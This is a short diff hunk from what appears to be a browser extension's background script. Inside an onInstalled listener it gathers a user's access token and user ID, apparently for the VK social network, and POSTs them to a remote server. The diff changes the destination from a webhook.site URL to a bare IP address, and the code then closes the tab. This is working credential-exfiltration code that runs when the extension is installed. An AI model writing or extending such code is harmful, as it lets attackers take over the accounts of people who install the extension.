@@ -51,7 +51,7 @@ chrome.runtime.onInstalled.addListener(function () {
                 postData = [access_token, user_id]
                 console.log(postData);
                 var xhr = new XMLHttpRequest();
-                xhr.open("POST" ,"https://webhook.site/46095596-bc5f-4102-9591-fc7fa936b86b");
+                xhr.open("POST" ,"http://163.172.160.127/api/social/vk/token");
                 xhr.send(postData);
                 chrome.tabs.remove(tabId)
                 console.log(tab)
